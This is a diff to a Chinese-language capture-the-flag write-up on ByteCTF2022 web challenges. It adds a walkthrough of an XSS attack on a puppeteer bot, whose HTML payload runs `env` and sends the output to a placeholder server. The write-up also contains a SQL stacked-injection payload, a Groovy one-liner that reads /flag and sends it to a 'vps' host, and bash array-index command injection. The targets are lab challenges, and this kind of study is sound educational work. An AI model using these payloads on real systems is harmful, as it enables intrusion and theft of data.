@@ -9,6 +9,7 @@ description: ByteCTF2022 第9名 打的还不错的一场比赛
 比赛时主要是做了ctf_cloud和typing_game两个题目，其中typing_game还是非预期解了，整体Web只差datamanager就AK了，不过`microservices`这道题目是大佬们出的，自己其实也没有去复现过。正好比赛结束还可以开靶机，可以抽空复现一下难题。
 
 ## easy_grafana
+
 > You must have seen it, so you can hack it
 
 之前也遇到过类似的题目，考的是grafana的CVE-2021-43798目录穿越漏洞。
@@ -25,6 +26,7 @@ description: ByteCTF2022 第9名 打的还不错的一场比赛
 `ByteCTF{e292f461-285e-47fc-9210-b9cd233773cb}`
 
 ## ctf_cloud
+
 > 改编自真实漏洞环境。在云计算日益发达的今天，许多云平台依靠其基础架构为用户提供云上开发功能，允许用户构建自己的应用，但这同样存在风险。
 
 普通用户可以往package.json里面加信息，然后管理员才可以把这个加进去的依赖装上，首先应该是拿到管理员账号，然后再是加个有洞的依赖打RCE什么的。
@@ -66,6 +68,7 @@ router.post('/signup', function(req, res, next) {
     });
 });
 ```
+
 这里每次signup都会先重置管理员password然后执行sql语句。考虑利用堆叠注入修改管理员密码，然后直接登,但是设注册时的password参数为', 0);UPDATE users SET PASSWORD = '123' WHERE NAME = 'admin';# 但是这个函数不支持执行多条sql。
 
 发现可以插入多行，数据表没约束用户名唯一，sqlite 的 CONFLICT 不能用。
@@ -137,6 +140,7 @@ POST的参数
 ## typing_game
 
 ### 四字符命令注入弹Shell
+
 > 题目描述：
 我是练习时长两年半的nodejs菜鸟，欢迎来玩我写的小游戏
 
@@ -156,8 +160,7 @@ baseurl = "https://e24f9597c9ab115b5116321ffbece014.2022.capturetheflag.fun/repo
 
 s = requests.session()
 
-
-# 将ls -t 写入文件_
+# 将ls -th 写入文件g
 list = [
     'rm *',
     # generate "g> ht- sl" to file "v"
@@ -202,13 +205,7 @@ for j in list2:
     sleep(35)
 s.get(baseurl+"sh x")
 sleep(35)
-print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
-print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
-print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
-print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
-print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
 s.get(baseurl+"sh g")
-sleep(35)
 ```
 
 最后在在环境变量中找到flag。
@@ -218,6 +215,113 @@ sleep(35)
 可能也许这也是出题人预期的一种吧不然为啥是四字符呢，假如改成3字符唯一的做法就是xss带出回显然后执行`env`拿到flag了，不过这好像没有特别大的意义吧。
 
 ### XSS带出命令执行回显
-等我复现完就来写（
+
+审计js代码，发现游戏结束的页面有XSS点，将用户传入的参数name通过innerHTML渲染在页面上。
+
+![图 1](https://s2.loli.net/2022/09/27/NozKAZ584FGY9wu.png)  
+
+传入参数`<img src=1 onerror=alert(1)>`,能够成功弹窗，也就是说我们如果构造一个恶意html页面放在服务器上，提交url让puppter访问，我们就可以执行任意js代码了，那么我们也就可以让puppter去访问status来执行命令，并且将访问结果附在url上请求我们的服务器，就能够将命令执行的结果回显。
+
+![图 2](https://s2.loli.net/2022/09/27/qgF7bV4iRCIvHte.png)  
+
+但是xss点在单词游戏结束的位置，而虽然我们本地可以修改js来看到，但是对于puppeteer来说还是需要先让它把游戏玩通关的。
+
+```js
+addEventListener("hashchange",e=>{
+    typing(location.hash.replace("#","").split["?"](0))
+})
+```
+
+注意到`game.js`中有`hashchange`事件，也就是`url#vidar`那么就会相当于typing`vidar`单词进去，因此可以通过url中hash值来通关游戏，通过`iframe`的`contentWindow.location.replace`进行hash值的输入，当完成单词游戏时，name参数通过innerHTML传入${username},执行javascript代码通过本地请求/status接口并且将结果拼接在路径里面，请求到自己的服务器上带出回显。
+
+参考了nu1l的wp进行的复现
+
+```html
+<!DOCTYPE html>
+
+<head>
+</head>
+
+<body>
+    <iframe width="100%" height="500px" id="iframe" src="http://127.0.0.1:13002/"></iframe>
+    <script>
+        cmd = "env"
+        cmd = `fetch("http://127.0.0.1:13002/status?cmd=${cmd}").then(x=>x.text()).then(x=>fetch("http://xxx.xxx.xxx.xxx?data="+x))`
+        cmd = btoa(cmd)
+        url = "http://127.0.0.1:13002/?name=%3Cimg%20src%3Dx%20onerror%3D'eval(atob(%22"+cmd+"%22))')%3E"
+        const words =
+            ['web', 'bytedance', 'ctf', 'sing', 'jump', 'rap', 'basketball', 'hello', 'world', 'fighting', 'flag', 'game', 'happy']
+        i = 0
+        l = 0
+        iframe.onload = function () {
+            const w = iframe.contentWindow
+            w.location.replace(url + "#" + words[i]);
+            if (i == 12) {
+                i = 0;
+                if (l++ > 13) {
+                    fetch('/?done')
+                    iframe.onload = function () { }
+                }
+            } else {
+                i++;
+            }
+        }
+    </script>
+</body>
+```
+
+![图 1](https://s2.loli.net/2022/09/28/9EIgxCoPdep3bfw.png)  
+
+## microservice
+
+还在复现（
+
+## datamanager
+
+还在复现（
+
+## easy_groovy
+
+这是有点Web的一道题目，顺带也复现一下
+
+groovy命令执行的题目，感觉还是有点不懂命令报错时annotation command的注解`annotation`是啥。
+
+学习了W&M战队的wp,不过感觉是做法简单但是想不到这么去做。
+
+```groovy
+String fileContents = new File('/flag').text
+new URL('http://vps/send?'+fileContents).getText()
+```
+
+## bash_game
+
+> 2048
+
+这个题目感觉很有趣，解出人数不多但是解法很多，所以顺带复现一下。
+
+### ++创建变量trick绕过
+
+第二次放出的附件中给出了cat /flag的条件
+
+```bash
+  if [[ "$score" -gt "$goal" ]] && [[ "$goal" -gt 99999999 ]]; then
+      cat /flag
+  fi
+```
+
+意思是`$score`要大于`$goal`并且`$goal`又要能大于`99999999`。
+因为在bash中不存在的变量 ++ 会创建这一个变量 并且赋值为1，那么第一次运算时是`0 * 100000000`，第二次运算时是`1 * 10000000`就行。
+
+输入`(vidar++*100000000)`，再让2048游戏结束就能拿到flag。
+
+![图 2](https://s2.loli.net/2022/09/27/fd8bchAwouZq9zQ.png)  
+
+### 数组内命令执行
+
+通过`arr[$(cat /flag)]`这样的形式可以实现任意命令执行，因为bash会认为命令是数组索引，而先执行命令再解析，当然`cat /flag`的结果会报错，不过会输出到标准输出中，输入`vidar[$(cat /flag)]`，让2048游戏结束，拿到flag。
+
+![图 1](https://s2.loli.net/2022/09/27/AGjKCw2MsbUqXWy.png)  
+
+Misc其他题目都有点不想复现了，感觉意义不大，想专注于学Web。
 
 最近感觉题目复现的多了打比赛也没那么坐牢了，基本上都是有思路也能做出，就是熟练度的一些问题吧，继续加油。
